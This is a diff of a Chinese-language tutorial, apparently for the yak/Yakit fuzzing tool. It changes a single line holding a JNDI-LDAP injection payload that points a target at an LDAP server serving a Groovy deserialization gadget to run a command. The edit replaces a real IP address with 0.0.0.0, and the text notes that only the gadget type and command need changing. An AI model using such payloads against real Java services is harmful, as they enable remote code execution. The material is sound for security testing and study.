@@ -251,7 +251,7 @@ jndiNu = func(Payload) {
 
 之后只需要改 GadgetType ，与Command即可
 
-```{{yak(jndiNu|${jndi:ldap://42.192.234.204:1389/Deserialization/Groovy1/Command/Base64/CommandNew}#ping 123)}}```
+```{{yak(jndiNu|${jndi:ldap://0.0.0.0:1389/Deserialization/Groovy1/Command/Base64/CommandNew}#ping 123)}}```
 
 ![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown微信截图_20220803130851.png)
 
